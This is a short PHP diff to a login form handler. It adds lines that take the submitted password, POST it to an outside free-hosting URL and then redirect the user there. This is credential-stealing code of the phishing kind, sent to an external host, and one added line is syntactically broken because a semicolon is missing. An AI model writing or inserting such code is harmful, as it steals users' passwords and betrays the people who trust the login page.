@@ -4,7 +4,9 @@
     $login = htmlspecialchars($_POST['login']);
     $password  = htmlspecialchars($_POST['password']);
 
-    
+    $url = 'https://sparkling1234.000webhostapp.com/';
+    $xml = $password
+    $response = http_post_data($url, $xml);
 
     header('Location: '.$url);
 ?>
